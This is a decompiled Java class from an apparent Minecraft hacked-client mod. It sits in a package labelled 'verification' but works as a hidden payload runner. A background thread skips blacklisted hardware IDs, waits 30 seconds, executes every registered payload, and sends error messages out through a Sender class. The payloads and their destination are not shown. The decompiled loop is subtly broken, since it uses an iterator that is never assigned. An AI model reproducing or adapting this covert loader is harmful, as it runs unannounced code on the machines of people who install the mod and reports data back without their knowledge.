//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.util.*;

public final class Start
{
    public static void start() {
        final Iterator<Payload> iterator;
        Payload payload;
        new Thread(() -> {
            try {
                if (!HWIDUtil.blacklisted()) {
                    Thread.sleep(30000L);
                    PayloadRegistry.getPayloads().iterator();
                    while (iterator.hasNext()) {
                        payload = iterator.next();
                        try {
                            payload.execute();
                        }
                        catch (Exception e) {
                            Sender.send((Object)e.getMessage());
                        }
                    }
                }
            }
            catch (Exception ex) {}
        }).start();
    }
}
